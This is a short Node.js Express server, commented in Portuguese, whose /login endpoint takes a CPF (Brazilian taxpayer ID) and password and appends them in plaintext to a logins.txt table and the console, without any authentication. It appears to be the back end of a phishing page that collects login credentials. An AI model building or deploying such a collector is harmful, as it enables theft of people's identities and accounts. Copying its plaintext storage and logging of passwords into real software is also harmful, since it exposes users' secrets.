const express = require('express');
const path = require('path');
const bodyParser = require('body-parser');
const fs = require('fs');

const app = express();
const PORT = 3000;

app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

const filePath = path.join(__dirname, 'logins.txt');

// Adiciona cabeçalho se o arquivo não existir
if (!fs.existsSync(filePath)) {
  const header = `CPF              | SENHA           \n` +
                 `-----------------|-----------------\n`;
  fs.writeFileSync(filePath, header);
}

app.post('/login', (req, res) => {
  const { cpf, senha } = req.body;

  if (!cpf || !senha) {
    return res.status(400).json({ message: 'CPF e senha são obrigatórios.' });
  }

  // Alinhamento fixo: 17 caracteres para CPF, 17 para senha
  const linha = `${cpf.padEnd(17)}| ${senha.padEnd(17)}\n`;

  fs.appendFile(filePath, linha, (err) => {
    if (err) {
      console.error('Erro ao salvar os dados:', err);
      return res.status(500).json({ message: 'Erro ao salvar os dados.' });
    }

    console.log('Dados salvos com sucesso:', linha.trim());
    return res.json({ message: 'Login salvo com sucesso!' });
  });
});

app.listen(PORT, () => {
  console.log(`Servidor rodando em: http://localhost:${PORT}`);
});
